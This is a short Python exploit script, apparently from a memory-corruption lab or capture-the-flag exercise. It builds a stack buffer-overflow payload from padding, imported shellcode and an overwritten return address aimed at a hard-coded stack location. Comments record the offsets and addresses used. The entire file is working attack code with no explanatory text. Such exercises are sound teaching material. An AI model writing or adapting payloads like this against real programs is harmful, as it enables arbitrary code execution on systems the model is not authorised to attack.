#!/usr/bin/env python3

import sys

from shellcode import shellcode
#sys.stdout.buffer.write(b'L'*8) 112 for input to return addr

# 16 bytes in stack before input, 112 to return addr, 54 is shellcode, 58 remaining
sys.stdout.buffer.write((0x70-54)*b'A'+shellcode+(8*b'A')+(2+0x7ffffff6d4e8).to_bytes(8,"little"))

# ret: 0x0000000000401e0f

#0x7ffffffed510
#140737488278800
#return addr: 0x0000000000401e0f

#0x7, 7
# start of shellcode: 0x7ffffff6d4b0

#0x7ffffffed510
#140737488278800

#0x7, 7